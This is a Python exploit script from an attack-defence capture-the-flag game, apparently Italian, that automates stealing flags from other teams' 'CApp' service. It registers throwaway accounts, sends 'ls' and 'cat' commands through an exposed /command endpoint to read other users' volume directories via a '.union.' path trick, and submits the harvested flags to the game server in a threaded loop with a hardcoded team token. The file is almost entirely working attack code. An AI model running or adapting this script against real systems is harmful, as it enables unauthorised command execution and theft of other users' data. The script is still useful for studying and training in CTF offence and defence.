#/usr/bin/python3

import requests, time, re, string, random, json
from threading import Thread, Lock

TEAM_TOKEN = "ddfe3c79ffdb518891f4f82ea90b433f"			# TEAM_TOKEN INVIATO PER EMAIL
CHALLENGE_NAME = "CApp"		# NOME DELLA CHALLENGE INDICATO IN flagIds

#######################      UTILS      ######################################

def generate_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def generate_fake_flag():
    letters = string.ascii_uppercase + string.digits
    result_str = ''.join(random.choice(letters) for i in range(31)) + "="
    return result_str

##############################################################################


lock = Lock()


class Attacker(Thread):
	def __init__(self, ip, flagids):
		Thread.__init__(self)
		self.ip = ip
		self.flagids = flagids
		

	def run(self):
		flag_list = []
		for hint in self.flagids[CHALLENGE_NAME][self.ip]:
			try:
				flag = get_flag(self.ip, hint)
				print(flag)
			except Exception as e:
				print("ERR: {}".format(e))
				continue
			if flag not in flag_list:
				flag_list.append(flag)
	
		lock.acquire()
		flags.extend(flag_list)
		lock.release()


def exploit_with_threads(flagids):
	c = 1
	i = 0
	size = len(flagids[CHALLENGE_NAME])
	for ip in flagids[CHALLENGE_NAME]:
		print(f"{ip}\t-\t{c} / {size} ...")

		threads.append(Attacker(ip, flagids))
		threads[i].start()

		i += 1
		c += 1
	
	for i in range(size):
		threads[i].join()


def exploit(flagids):
	flag_list = []
	c = 1
	for ip in flagids[CHALLENGE_NAME]:
		size = len(flagids[CHALLENGE_NAME])
		print(f"{ip}\t-\t{c} / {size} ...")
		for hint in flagids[CHALLENGE_NAME][ip]:
			try:
				flag = get_flag(ip, hint)
				print(flag)
			except Exception as e:
				print("ERR: {}".format(e))
				continue
			if flag not in flag_list:
				flag_list.append(flag)

		c += 1
	return flag_list


# EXPLOIT FINALE CON USO DEI THREADS
def attack_with_threads():
	global flags
	global threads
	while True:
		flags = []
		threads = []
		print("Running exploit...")

		flagids = requests.get("http://10.10.0.1:8081/flagIds").json()
		exploit_with_threads(flagids)
		
		print()
		print(flags)

		print("\nPutting flags...")
		r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
		print(r)

		print("Exploit ok...\n\nRepeat after sleep...")
		print("\n")

		time.sleep(60)


# EXPLOIT FINALE
def attack():
	while True:
		print("Running exploit...")

		flagids = requests.get("http://10.10.0.1:8081/flagIds").json()
		flags = exploit(flagids)
		
		print()
		print(flags)

		print("\nPutting flags...")
		r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
		print(r)

		print("Exploit ok...\n\nRepeat after sleep...")
		print("\n")

		time.sleep(10)


			
	
def get_flag(ip, hint):
	userid = json.loads(hint)["user_id"]
	session = requests.Session()

	username = generate_random_string(10)
	password = "password"

	data = f"username={username}&password={password}"
	register = session.post(f"http://{ip}/register" , data = data, headers = {"Content-Type": "application/x-www-form-urlencoded"}, timeout=3)
	
	cmd = {"command": f"ls .union./volume-{userid}/"}
	cmd1 = session.post(f"http://{ip}/command", json=cmd, timeout=3).json()
	files = cmd1["output"].split(" ")

	for f in files:
		cmd = {"command": f"cat .union./volume-{userid}/{f}"}
		cmd2 = session.post(f"http://{ip}/command", json=cmd, timeout=3).json()
		res = cmd2["output"]
		flag1 = re.findall("[A-Z0-9]{31}=", res)
		flag = flag1[0]
		if flag is not None:
			return flag
	
	raise Exception("No flag founded!")
	


## TEST get_flag
def test():
	ip = "10.60.0.1"
	hint = '{"username": "n2eLrNKmOtT", "user_id": "d06dc2c4-a15d-4cdf-bd95-09b16570ea57"}'
	flag = get_flag(ip, hint)
	print(flag)


def main():
	# test()
	# attack()
	attack_with_threads()


main()
